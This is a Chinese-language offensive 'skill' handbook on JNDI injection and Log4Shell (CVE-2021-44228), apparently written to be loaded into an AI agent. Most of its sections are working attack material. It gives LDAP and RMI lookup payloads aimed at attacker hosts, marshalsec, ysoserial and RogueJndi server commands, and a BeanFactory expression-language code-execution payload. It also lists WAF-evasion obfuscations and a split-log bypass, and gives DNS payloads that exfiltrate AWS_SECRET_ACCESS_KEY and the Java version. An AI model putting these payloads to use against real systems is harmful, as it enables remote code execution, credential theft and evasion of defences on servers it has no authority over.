# 技能：JNDI注入——专家攻击手册

> **AI加载指令**：专家级JNDI注入技术。涵盖查找机制滥用、RMI/LDAP类加载、JDK版本限制、Log4Shell（CVE-2021-44228）、marshalsec工具以及8u191之后的反序列化漏洞绕过。基础模型常将JNDI注入与通用反序列化混淆——本文件明确区分攻击面。

## 0. 相关路由

- [不安全反序列化](../deserialization-insecure/SKILL.md) 当JNDI导致反序列化（8u191之后绕过路径）
- [表达式语言注入](../expression-language-injection/SKILL.md) 当JNDI接收点是SpEL或OGNL表达式评估

---

## 1. 核心机制

JNDI（Java命名和目录接口）为从命名/目录服务（RMI、LDAP、DNS、CORBA）查找对象提供统一API。

**漏洞**：当`InitialContext.lookup(USER_INPUT)`接收攻击者控制的URL时，JVM连接到攻击者服务器并加载/执行任意代码。

```java
// 易受攻击代码模式：
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. 攻击向量

### RMI（远程方法调用）

```
rmi://attacker.com:1099/Exploit
```

攻击者运行RMI服务器返回指向远程类的`Reference`对象：
```java
// 攻击者的RMI服务器返回：
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM下载http://attacker.com/Exploit.class并实例化它
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

攻击者运行LDAP服务器返回包含`javaCodeBase`、`javaFactory`或序列化对象属性的条目。

LDAP比RMI更受青睐，因为LDAP限制是后期添加的（JDK 8u191对比8u121的RMI）。

### DNS（仅检测）

```
dns://attacker-dns-server/lookup-name
```

用于确认JNDI注入而不需要RCE——触发对攻击者权威NS的DNS查询。

---

## 3. JDK版本限制和绕过

| JDK版本 | RMI远程类 | LDAP远程类 | 绕过 |
|---|---|---|---|
| < 8u121 | 是 | 是 | 直接类加载 |
| 8u121 – 8u190 | 否 (`trustURLCodebase=false`) | 是 | 使用LDAP向量 |
| >= 8u191 | 否 | 否 | 通过LDAP返回序列化gadget对象 |
| >= 8u191（替代方案） | 否 | 否 | `BeanFactory` + EL注入 |

### 8u191之后绕过：LDAP→序列化Gadget

攻击者LDAP服务器不返回远程类URL，而是返回**序列化Java对象**在`javaSerializedData`属性中。JVM本地反序列化它——如果类路径上有gadget链（如CommonsCollections），则实现RCE。

```bash
# ysoserial JRMPListener方法：
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# 然后JNDI查找指向：rmi://attacker:1099/whatever
```

### 8u191之后绕过：BeanFactory + EL

当Tomcat的`BeanFactory`在类路径上时，LDAP响应可以引用它作为带有EL表达式的工厂：

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. 工具

### marshalsec — JNDI引用服务器

```bash
# 启动提供远程类的LDAP服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# 启动RMI服务器：
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# #Exploit指向http://attacker.com/Exploit.class上的Exploit.class
```

### JNDI-Injection-Exploit（一站式）

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# 自动启动带有多种绕过策略的RMI + LDAP服务器
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# 提供RMI、LDAP和HTTP服务器，自动生成payload
```

---

## 5. Log4J2 — CVE-2021-44228（LOG4SHELL）

### 机制

Log4j2支持**查找**——如`${...}`在日志消息中评估的表达式。`jndi`查找触发`InitialContext.lookup()`：

```
${jndi:ldap://attacker.com/x}
```

**任何包含此模式的记录字符串**都会触发漏洞——用户代理、表单字段、HTTP头、URL路径、错误消息。

### 检测Payload

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# 通过DNS窃取环境信息：
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF绕过变体

Log4j2的查找解析器非常灵活：

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### 分日志绕过（高级）

当WAF检测到单个请求中成对的`${jndi:...}`跨两个日志条目时：

```text
# 请求1（首先记录）：
X-Custom: ${jndi:ldap://attacker.com/
# 请求2（其次记录）：
X-Custom: exploit}
```

如果应用程序在重新处理前连接日志条目（例如聚合管道），则组合的`${jndi:ldap://attacker.com/exploit}`会触发。

### 真实案例：Solr Log4Shell

```bash
# 通过DNSLog确认——Solr管理核心API：
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS命中Java版本 = 确认Solr中的Log4Shell
```

### 要测试的注入点

```text
用户代理          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie值       URL路径段     POST正文字段
搜索查询      文件上传名     表单字段名
GraphQL变量   SOAP/XML元素     JSON值
```

### 受影响版本

- Log4j2 2.0-beta9至2.14.1
- 2.15.0（部分修复），完全修复于2.17.0
- Log4j 1.x不受影响（不同的查找机制）

---

## 6. 其他JNDI接收点（Log4J之外）

| 产品/框架 | 接收点 |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | 配置API，VelocityResponseWriter |
| Apache Druid | 各种配置端点 |
| VMware vCenter | 多个端点 |
| H2数据库控制台 | JNDI连接字符串 |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. 测试方法

```
疑似JNDI注入点？
├── 发送DNS仅探测：${jndi:dns://TOKEN.collab.net}
│   └── DNS命中？→ 确认JNDI评估
│
├── 确定JDK版本：
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191？
│   ├── 启动marshalsec LDAP服务器带远程类
│   └── ${jndi:ldap://attacker:1389/Exploit} → 直接RCE
│
├── JDK >= 8u191？
│   ├── LDAP→序列化gadget（需类路径上有gadget链）
│   ├── BeanFactory + EL（需Tomcat在类路径上）
│   └── ysoserial的JRMPListener
│
└── WAF阻止${jndi:...}？
    └── 尝试混淆：${${lower:j}ndi:...}
```

---

## 8. 快速参考

```text
# 安全确认（仅DNS）：
${jndi:dns://TOKEN.collab.net}

# LDAP RCE（JDK < 8u191）：
${jndi:ldap://ATTACKER:1389/Exploit}

# 版本窃取：
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# 带WAF绕过的Log4Shell：
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# 启动LDAP引用服务器：
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# 8u191之后 — ysoserial JRMP：
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```
